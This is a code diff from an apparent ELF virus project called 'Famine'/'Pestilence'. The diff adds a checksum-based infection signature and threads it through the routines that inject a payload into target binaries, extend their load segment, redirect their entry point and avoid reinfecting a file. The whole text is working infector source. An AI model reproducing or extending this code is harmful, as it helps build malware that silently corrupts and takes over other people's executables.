@@ -61,7 +61,7 @@ static void _insert_zeros(char **s, size_t *n, size_t pos, size_t add){
 	*n = (*n) + add;
 }
 
-void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt){
+void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt, char *s, size_t sn){
 	//add a few information about himself
 	Elf64_Ehdr *bh = (void*)b;
 	size_t pos = 0/*elf_offset_entry(b, n)*/;
@@ -81,6 +81,7 @@ void update(char *b, size_t n, size_t old_entry, size_t entry, struct s_opt opt)
 	p[4] = ((size_t*)key)[1];
 	*(unsigned char*)(p + 3) ^= 0b01110010;
 	encrypt((char*)(p+5), 15, (uint32_t*)key);
+	get_sig(s, sn, n, p + 7);
 }
 
 static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, size_t crypt_len, struct s_opt opt){
@@ -117,7 +118,7 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 	elf_change_size_last_load_segment(*s, *n, bn);
 	elf_set_off_entry(*s, *n, pos + 1);
 	h = (void*)*s;
-	update((*s) + pos + 1, bn, old_entry, h->e_entry, opt);
+	update((*s) + pos + 1, bn, old_entry, h->e_entry, opt, *s, *n);
 	ffree(olds2, oldn2);
 	if (olds)
 		ffree(olds, oldn);
@@ -126,16 +127,52 @@ static int _infect(char **s, size_t *n, char *b, size_t bn, size_t crypt_off, si
 
 //=============================================================
 
-int check_already_packed(char *s, size_t n){
-	char *sig = "Famine version 1.0 (c)oded by ndombre-agadhgad";
-	size_t len = slen(sig)-1;
+int get_sig(char *s, size_t n, size_t virus_len, char *sig)
+{
+	Elf64_Ehdr *h = (void*)s;
+	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
+	size_t sig_len = slen(sig);
+
+	if (entry + virus_len >= n)
+		return fail("invalid entry point");
+
+	size_t i;
+	size_t sig_sum = 0;;
+
+	for (i = 0; i < virus_len; i++)
+	{
+		if (i == (size_t)(DATA + 7 * sizeof(size_t*)))
+			i += sig_len;
+		sig_sum += *(unsigned char*)(s + entry + i);
+	}
+
+	sig[sig_len - 8] = ((sig_sum / 1) % 10) + '0';
+	sig[sig_len - 7] = ((sig_sum / 10) % 10) + '0';
+	sig[sig_len - 6] = ((sig_sum / 100) % 10) + '0';
+	sig[sig_len - 5] = ((sig_sum / 1000) % 10) + '0';
+	sig[sig_len - 4] = ((sig_sum / 10000) % 10) + '0';
+	sig[sig_len - 3] = ((sig_sum / 100000) % 10) + '0';
+	sig[sig_len - 2] = ((sig_sum / 1000000) % 10) + '0';
+	sig[sig_len - 1] = ((sig_sum / 10000000) % 10) + '0';
+
+	return TRUE;
+}
+
+int check_already_packed(char *s, size_t n, size_t virus_len){
+	char sig[] = "Pestilence version 1.0 (c)oded by ndombre-agadhgad-AAAAAAAA";
+	size_t sig_len = slen(sig);
 	Elf64_Ehdr *h = (void*)s;
 	size_t entry = elf_addr_to_offset(s,n,h->e_entry);
 	//check if size is enoug
-	if (entry + DATA + 7*sizeof(size_t) + len >= n)
+	if (entry + DATA + 7*sizeof(size_t) + sig_len >= n)
 		return fail("invalid entry point");
+	if (get_sig(s, n, virus_len, sig) == FALSE)
+		return FALSE;
 	size_t *p = ((size_t *)(char*)(s + entry + DATA));
-	if (sncmp((char*)(p+7), sig, slen(sig)) == 0)
+	//print(sig);
+	//print(p + 7);
+	//print("\n");
+	if (sncmp((char*)(p+7), sig, sig_len) == 0)
 		return fail("already packed");
 	return TRUE;
 }
@@ -164,7 +201,7 @@ int infect(char *fname, char *outname, char *b, size_t bn, size_t crypt_off, siz
 		goto fail;
 	}
 	if (elf_check_valid(s, n) == FALSE) goto fail;
-	if (!check_already_packed(s, n)) goto fail;
+	if (!check_already_packed(s, n, bn)) goto fail;
 
 	//after insert, update data
 	if (!_infect(&s,&n, b, bn, crypt_off, crypt_len, opt))
